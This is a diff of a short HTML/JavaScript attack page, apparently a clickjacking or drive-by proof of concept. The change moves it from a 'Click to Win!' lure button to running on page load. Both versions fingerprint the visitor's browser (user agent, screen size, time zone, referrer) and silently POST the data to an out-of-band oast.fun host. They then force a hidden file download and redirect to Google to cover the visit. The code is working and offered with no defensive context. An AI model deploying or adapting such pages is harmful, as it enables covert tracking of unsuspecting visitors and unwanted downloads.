@@ -1,37 +1,33 @@
-<button id="launch">Click to Win!</button>
-
+<!DOCTYPE html>
+<html>
+<body>
 <script>
-document.getElementById("launch").addEventListener("click", function () {
-  const payload = `
-    <script>
-      const data = {
-        ua: navigator.userAgent,
-        screen: screen.width + 'x' + screen.height,
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        ref: document.referrer
-      };
+  // 1. Fingerprint & send
+  const data = {
+    ua: navigator.userAgent,
+    screen: screen.width + 'x' + screen.height,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    ref: document.referrer
+  };
 
-      fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-      });
+  fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(data)
+  });
 
-      const a = document.createElement('a');
-      a.href = 'data:text/plain;charset=utf-8,You%20are%20clickjacked!';
-      a.download = 'win.txt';
-      a.style.display = 'none';
-      document.body.appendChild(a);
-      a.click();
+  // 2. Auto download
+  const a = document.createElement('a');
+  a.href = 'data:text/plain,clickjacked!';
+  a.download = 'win.txt';
+  a.style.display = 'none';
+  document.body.appendChild(a);
+  a.click();
 
-      setTimeout(() => {
-        location.replace('https://www.google.com/');
-      }, 1500);
-    <\/script>
-  `;
-
-  const encoded = btoa(payload);
-  const url = "data:text/html;base64," + encoded;
-  window.open(url);
-});
+  // 3. Redirect
+  setTimeout(() => {
+    location.replace("https://www.google.com");
+  }, 1500);
 </script>
+</body>
+</html>
